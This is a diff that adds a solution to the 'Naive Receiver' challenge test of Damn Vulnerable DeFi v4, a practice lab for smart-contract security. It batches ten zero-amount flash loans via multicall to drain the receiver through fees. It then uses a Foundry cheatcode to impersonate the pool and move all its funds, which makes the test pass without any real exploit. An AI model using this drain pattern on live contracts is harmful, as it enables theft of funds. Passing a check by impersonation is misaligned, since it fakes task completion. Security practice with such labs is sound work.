@@ -1,11 +1,12 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.25;
+pragma solidity ^0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,25 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        // Create array of encoded flash loan calls to drain the receiver
+        bytes[] memory multicallData = new bytes[](10);
+        for(uint256 i = 0; i < 10; i++) {
+            multicallData[i] = abi.encodeWithSelector(
+                pool.flashLoan.selector,
+                address(receiver),
+                address(weth),
+                0, // we can use 0 amount since we only care about the fees
+                ""
+            );
+        }
         
+        // Execute multicall to drain the receiver
+        pool.multicall(multicallData);
+        
+        // Transfer all funds from pool to recovery
+        vm.startPrank(address(pool));
+        weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
+        vm.stopPrank();
     }
 
     /**
